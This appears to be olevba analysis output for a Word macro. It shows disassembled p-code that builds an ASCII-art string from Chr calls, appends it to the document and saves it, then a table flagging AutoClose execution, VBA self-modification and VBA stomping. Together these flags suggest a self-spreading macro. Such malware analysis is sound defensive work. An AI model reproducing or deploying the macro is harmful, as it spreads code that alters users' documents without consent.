' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St msg 
' Line #144:
' 	Ld msg 
' 	Ld _B_var_SetRange 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St msg 
' Line #145:
' 	Ld msg 
' 	Ld _B_var_SetRange 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St msg 
' Line #146:
' 	Ld msg 
' 	Ld _B_var_SetRange 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St msg 
' Line #147:
' 	Ld msg 
' 	Ld _B_var_SetRange 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St msg 
' Line #148:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd Content 
' 	MemLd End 
' 	LitDI2 0x0001 
' 	Sub 
' 	Ld ActiveDocument 
' 	MemLd Content 
' 	MemLd End 
' 	Ld ActiveDocument 
' 	ArgsMemLd Start 0x0002 
' 	Set _B_var_myR 
' Line #149:
' 	Ld msg 
' 	Ld _B_var_myR 
' 	ArgsMemCall SetRange 0x0001 
' Line #150:
' 	LitStr 0x000B "Courier New"
' 	Ld _B_var_myR 
' 	MemLd Move 
' 	MemSt New 
' Line #151:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #152:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Base64    |?]7                 |P103                                         |
|String    |                    |                                             |
|Base64    |C_7                 |Q183                                         |
|String    |                    |                                             |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

